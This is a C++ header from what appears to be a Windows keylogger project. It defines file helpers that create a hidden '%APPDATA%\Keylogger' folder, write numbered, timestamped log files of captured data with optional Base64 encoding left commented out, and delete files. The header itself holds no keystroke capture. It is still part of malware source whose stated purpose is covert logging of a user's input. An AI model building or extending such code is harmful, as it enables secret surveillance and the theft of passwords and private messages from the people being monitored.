#pragma once
#include<string>
#include<cstdlib>
#include<fstream>
#include"windows.h"
#include"Helper.h"
#include"Base64.h"

namespace IO {
	static int logCounter = 1;
	std::string GetOurPath(const bool append_sep = false) {
		char* buf = nullptr;
		size_t s = 0;
		_dupenv_s(&buf, &s, "APPDATA");
		std::string appdata_dir(buf);
		std::string full = appdata_dir + "\\Keylogger";
		return full + (append_sep ? "\\" : "");
	}

	bool IsPathExist(const std::string& s){
		struct stat buffer;
		return (stat(s.c_str(), &buffer) == 0);
	}

	bool MakeOneDir(std::string path) {
		std::wstring wstr = std::wstring(path.begin(), path.end());
		LPCWSTR p = wstr.c_str();
		return (bool)CreateDirectory(p, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}
	bool MakeDir(std::string path) {
		for (char& c : path) {
			if (c == '\\') {
				c = '\0';
				if (!IsPathExist(path)) {
					if (!MakeOneDir(path)) {
						return false;
					}
				}
				c = '\\';
			}
		}
		return true;
	}

	template <class T>
	std::string WriteLog(const T& t) {
		std::string path = GetOurPath(true);
		Helper::DateTime dt;
		std::string name = "Log-" + dt.getDateTimeString() + "(" + std::to_string(IO::logCounter) + ").log";
		IO::logCounter += 1;
		try{
			std::string full = path + name;
			std::ofstream f(full);
			if (!f) 
				return "Not Good";
			std::ostringstream s;
			s << "[" << dt.getDateTimeString() << "]" << std::endl << t << std::endl;
			std::string data = s.str();
			//std::string data = Base64::Encrypt64(s.str());
			f << s.str();
			f.close();
			return name;
		}
		catch (...){
			return "";
		}
	}

	bool RemoveFile(const std::string filename) {
		std::wstring wFileName(filename.begin(), filename.end());
		return DeleteFile(wFileName.c_str());
	}
}